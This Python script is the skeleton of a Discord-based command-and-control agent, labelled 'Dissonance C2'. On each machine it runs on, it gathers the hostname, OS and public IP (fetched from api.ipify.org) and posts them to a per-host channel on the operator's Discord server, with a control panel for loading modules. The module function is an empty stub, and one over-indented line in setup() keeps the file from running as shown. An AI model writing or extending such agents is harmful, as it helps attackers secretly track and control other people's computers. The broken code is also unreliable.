import os
import discord
import requests
import socket
import time
import platform

TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = int(os.getenv("GUILD_ID"))
HOSTNAME = socket.gethostname()

MODULES_CATEGORY_NAME = "MODULES"
AGENTS_CATEGORY_NAME = "AGENTS"
MODULES_CHANNEL_NAME = "modules"

start_time = time.time()


modules = {}
modules_channel = None
agent_channel = None
panel = None

def public_ip():
    try:
        return requests.get(
            "https://api.ipify.org",
            timeout=5
        ).text
    except requests.RequestException:
        return "Unknown"

PUBLIC_IP = public_ip()
OS = platform.system()

intents = discord.Intents.default()
intents.message_content = True

bot = discord.Client(intents=intents)

 # create the embed for the panel
def embed():

    uptime = int(time.time() - start_time)

    days, uptime = divmod(uptime, 86400)
    hours, uptime = divmod(uptime, 3600)
    minutes, seconds = divmod(uptime, 60)

    e = discord.Embed(
        title="DISSONANCE",
    )

    e.add_field(
        name="🖥️ Machine",
        value=f"`{HOSTNAME}`",
        inline=True
    )

    e.add_field(
        name="💻 OS",
        value=f"`{OS}`",
        inline=True
    )

    e.add_field(
        name="🌐 Public IP",
        value=f"`{PUBLIC_IP}`",
        inline=True
    )

    e.add_field(
        name="⏱️ Uptime",
        value=f"`{days}d {hours}h {minutes}m {seconds}s`",
        inline=True
    )

    e.set_footer(
        text="Dissonance C2 • Agent Status"
    )

    return e

async def refresh_modules():
    pass

async def move_panel():
    global panel

    if not agent_channel:
        return

    if panel:
        try:
            await panel.delete()
        except discord.NotFound:
            pass

    panel = await agent_channel.send(
        embed=embed(),
        view=ModuleView()
    )


class ModuleView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=None)

        refresh_button = discord.ui.Button(
            label="Refresh",
            emoji="🔄",
            style=discord.ButtonStyle.primary,
            custom_id="panel:refresh",
        )

        async def refresh_callback(interaction):
            await interaction.response.defer()

            await refresh_modules()
            await move_panel()
        
        refresh_button.callback = refresh_callback
        self.add_item(refresh_button)

async def setup():
    global agent_channel, modules_channel, panel
    guild = bot.get_guild(GUILD_ID)

    if not guild:
        print("[!] Guild not found")
        exit()

    # Find the existing AGENTS category
    category = discord.utils.get(
        guild.categories,
        name=AGENTS_CATEGORY_NAME
    )

    if not category:
        print("[!] AGENTS Category not found")
        exit()

    # Find this agent's channel inside AGENTS
    agent_channel = discord.utils.get(
        category.text_channels,
        name=HOSTNAME
    )

        modules_category = discord.utils.get(
        guild.categories,
        name=MODULES_CATEGORY_NAME
    )

    if not modules_category:
        print("[!] MODULES Category not found")
        return

    modules_channel = discord.utils.get(
        modules_category.text_channels,
        name=MODULES_CHANNEL_NAME
    )

    if not modules_channel:
        print("[!] Modules Channel not found")
        exit()
    

    # Create the channel if it doesn't exist
    if not agent_channel:

        print("[!] AGENTS Channel not found")

        agent_channel = await guild.create_text_channel(
            HOSTNAME,
            category=category
        )

        print(f"[+] AGENTS Channel created: #{HOSTNAME}")

    else:
        print(f"[+] AGENTS Channel found: #{HOSTNAME}")

    # Create the panel
    panel = await agent_channel.send(
        embed=embed(),
        view=ModuleView()
    )


@bot.event
async def on_ready():
    print(f"Connected as {bot.user}")
    await setup()




bot.run(TOKEN)